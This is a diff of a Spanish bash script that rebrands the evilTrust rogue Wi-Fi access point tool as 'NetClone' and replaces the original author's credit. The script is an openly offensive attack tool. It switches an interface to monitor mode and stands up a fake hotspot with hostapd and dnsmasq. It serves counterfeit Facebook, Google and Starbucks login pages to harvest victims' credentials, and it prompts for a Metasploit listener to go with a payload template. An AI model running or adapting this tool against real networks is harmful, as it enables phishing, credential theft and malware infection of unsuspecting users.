@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# evilTrust v2.0, Author @s4vitar (Marcelo Vázquez)
+# NetClone v3.0, Author @Bons18
 
 # Colores (Cambiados a tonos morados)
 endColour="\033[0m\e[0m"
@@ -24,19 +24,18 @@ function ctrl_c(){
 }
 
 function banner(){
-echo -e "\n${purpleColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮"
-sleep 0.05
-echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮"
-sleep 0.05
-echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯"
-sleep 0.05
-echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${lightPurpleColour}(${endColour}${grayColour}Hecho por ${endColour}${darkPurpleColour}s4vitar${endColour}${lightPurpleColour})${endColour}${purpleColour}"
-sleep 0.05
-echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮"
-sleep 0.05
-echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}"
-sleep 0.05
+    echo -e "\n${purpleColour} ▐ ▄ ▄▄▄ .▄▄▄▄▄ ▄▄· ▄▄▌         ▐ ▄ ▄▄▄ ."
+    sleep 0.05
+    echo -e "•█▌▐█▀▄.▀·•██  ▐█ ▌▪██•  ▪     •█▌▐█▀▄.▀·"
+    sleep 0.05
+    echo -e "▐█▐▐▌▐▀▀▪▄ ▐█.▪██ ▄▄██▪   ▄█▀▄ ▐█▐▐▌▐▀▀▪▄"
+    sleep 0.05
+    echo -e "██▐█▌▐█▄▄▌ ▐█▌·▐███▌▐█▌▐▌▐█▌.▐▌██▐█▌▐█▄▄▌"
+    sleep 0.05
+    echo -e "▀▀ █▪ ▀▀▀  ▀▀▀ ·▀▀▀ .▀▀▀  ▀█▄▀▪▀▀ █▪ ▀▀▀${endColour}"
+    sleep 0.05
 }
+
 
 function dependencies(){
 	sleep 1.5; counter=0
@@ -100,7 +99,7 @@ function startAttack(){
 	done
 
 	rm iface 2>/dev/null
-	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
+	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: WifiGratis):${endColour} " && read -r use_ssid
 	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
 	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
 	sleep 2
@@ -140,8 +139,11 @@ function startAttack(){
 	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
 	sleep 5
 
-	# Array de plantillas
-	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
+	plantillas=(
+    facebook-login 
+    google-login 
+    optimumwifi 
+)
 
 	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
 	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
@@ -183,27 +185,9 @@ function startAttack(){
 	fi
 }
 
-function helpPanel(){
-	echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮"
-	sleep 0.05
-	echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮"
-	sleep 0.05
-	echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯"
-	sleep 0.05
-	echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${yellowColour}(${endColour}${grayColour}Hecho por ${endColour}${blueColour}s4vitar${endColour}${yellowColour})${endColour}${redColour}"
-	sleep 0.05
-	echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮"
-	sleep 0.05
-	echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}"
-	echo -e "\n${grayColour}Uso:${endColour}"
-	echo -e "\t${redColour}[-m]${endColour}${blueColour} Modo de ejecución${endColour}${yellowColour} (terminal|gui)${endColour}${purpleColour} [-m terminal | -m gui]${endColour}"
-	echo -e "\t${redColour}[-h]${endColour}${blueColour} Mostrar este panel de ayuda${endColour}\n"
-	exit 1
-}
-
 function guiMode(){
-	whiptail --title "evilTrust - by S4vitar" --msgbox "Bienvenido a evilTrust, una herramienta ofensiva ideal para desplegar un Rogue AP a tu gusto." 8 78
-	whiptail --title "evilTrust - by S4vitar" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "Bienvenido a NetClone, una herramienta ofensiva ideal para desplegar un Rogue AP a tu gusto." 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "Deja que compruebe que cuentas con todos los programas necesarios antes de empezar..." 8 78
 
 	tput civis; dependencias=(php dnsmasq hostapd)
 
@@ -214,10 +198,10 @@ function guiMode(){
         done
 
         if [ $counter_dep -eq "3" ]; then
-		whiptail --title "evilTrust - by S4vitar" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 8 78
+		whiptail --title "NetClone - by Bons18" --msgbox "Perfecto, parece ser que cuentas con todo lo necesario..." 8 78
 		tput civis
         else
-		whiptail --title "evilTrust - by S4vitar" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 8 78
+		whiptail --title "NetClone - by Bons18" --msgbox "Se ve que te faltan algunas dependencias, necesito que cuentes con las utilidades php, dnsmasq y hostapd instaladas" 8 78
                 exit 1
         fi
 
@@ -225,27 +209,27 @@ function guiMode(){
                 rm -rf credenciales.txt
         fi
 
-	whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "A continuación, te voy a listar tus interfaces de red disponibles, necesitaré que escojas aquella que acepte el modo monitor" 8 78
 
 	tput civis; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
         counter=1; for interface in $(cat iface); do
                 let counter++
         done
         checker=0; while [ $checker -ne 1 ]; do
-		choosed_interface=$(whiptail --inputbox "Interfaces de red disponibles:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "evilTrust - Interfaces de red" 3>&1 1>&2 2>&3)
+		choosed_interface=$(whiptail --inputbox "Interfaces de red disponibles:\n\n$(ifconfig | cut -d ' ' -f 1 | xargs | tr -d ':' | tr ' ' '\n' | while read line; do echo "[*] $line"; done)" 13 78 --title "NetClone - Interfaces de red" 3>&1 1>&2 2>&3)
                 for interface in $(cat iface); do
                         if [ "$choosed_interface" == "$interface" ]; then
                                 checker=1
                         fi
-                done; if [ $checker -eq 0 ]; then whiptail --title "evilTrust - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 8 78; fi
+                done; if [ $checker -eq 0 ]; then whiptail --title "NetClone - Error en la selección de interfaz" --msgbox "La interfaz proporcionada no existe, vuelve a introducir la interfaz y asegúrate de que sea correcta" 8 78; fi
         done
 
-	tput civis; whiptail --title "evilTrust - by S4vitar" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
+	tput civis; whiptail --title "NetClone - by Bons18" --msgbox "A continuación se va a configurar la interfaz $choosed_interface en modo monitor..." 8 78
 	tput civis; airmon-ng start $choosed_interface > /dev/null 2>&1; choosed_interface="${choosed_interface}mon"
 
 	rm iface 2>/dev/null
-	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ej: wifiGratis):" 8 78 --title "evilTrust - by S4vitar" 3>&1 1>&2 2>&3)
-	whiptail --title "evilTrust - by S4vitar" --checklist \
+	use_ssid=$(whiptail --inputbox "Introduce el nombre del punto de acceso a utilizar (Ej: wifiGratis):" 8 78 --title "NetClone - by Bons18" 3>&1 1>&2 2>&3)
+	whiptail --title "NetClone - by Bons18" --checklist \
 	"Selecciona el canal bajo el cual quieres que el punto de acceso opere (Presiona la tecla <Espacio> para seleccionar el canal)" 20 78 12 \
 	1 "(Usar este canal) " OFF \
 	2 "(Usar este canal) " OFF \
@@ -262,7 +246,7 @@ function guiMode(){
 
 	use_channel=$(cat use_channel | tr -d '"'); rm use_channel
 
-	whiptail --title "evilTrust - by S4vitar" --msgbox "Perfecto, voy a crearte unos archivos de configuración para desplegar el ataque..." 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "Perfecto, voy a crearte unos archivos de configuración para desplegar el ataque..." 8 78
 
 	tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando... (Este proceso tarda unos segundos)${endColour}"
         sleep 2
@@ -302,9 +286,9 @@ function guiMode(){
         # Array de plantillas
         plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
 
-	whiptail --title "evilTrust - by S4vitar" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78
+	whiptail --title "NetClone - by Bons18" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78
 
-        whiptail --title "evilTrust - by S4vitar" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \
+        whiptail --title "NetClone - by Bons18" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \
         facebook-login "Plantilla de inicio de sesión de Facebook" OFF \
         google-login "Plantilla de inicio de sesión de Google" OFF \
         starbucks-login "Plantilla de inicio de sesión de Starbucks" OFF \
@@ -328,21 +312,21 @@ function guiMode(){
         fi; clear
 
         if [ $check_plantillas -eq 1 ]; then
-		whiptail --title "evilTrust - by S4vitar" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
+		whiptail --title "NetClone - by Bons18" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                 tput civis; pushd $template > /dev/null 2>&1
                 php -S 192.168.1.1:80 > /dev/null 2>&1 &
                 sleep 2
                 popd > /dev/null 2>&1; getCredentials
         elif [ $check_plantillas -eq 2 ]; then
-		whiptail --title "evilTrust - by S4vitar" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
+		whiptail --title "NetClone - by Bons18" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78
                 tput civis; pushd $template > /dev/null 2>&1
                 php -S 192.168.1.1:80 > /dev/null 2>&1 &
                 sleep 2
-		whiptail --title "evilTrust - by S4vitar" --msgbox "Configura desde otra consola un Listener en Metasploit de la siguiente forma:\n\n$(cat msfconsole.rc)" 15 78
+		whiptail --title "NetClone - by Bons18" --msgbox "Configura desde otra consola un Listener en Metasploit de la siguiente forma:\n\n$(cat msfconsole.rc)" 15 78
                 popd > /dev/null 2>&1; getCredentials
 	else
-		whiptail --title "evilTrust - by S4vitar" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
-		template=$(whiptail --title "evilTrust - by S4vitar" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "evilTrust - Plantilla personalizada" 3>&1 1>&2 2>&3)
+		whiptail --title "NetClone - by Bons18" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :)" 8 78
+		template=$(whiptail --title "NetClone - by Bons18" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "NetClone - Plantilla personalizada" 3>&1 1>&2 2>&3)
                 pushd $template > /dev/null 2>&1
                 php -S 192.168.1.1:80 > /dev/null 2>&1 &
                 sleep 2
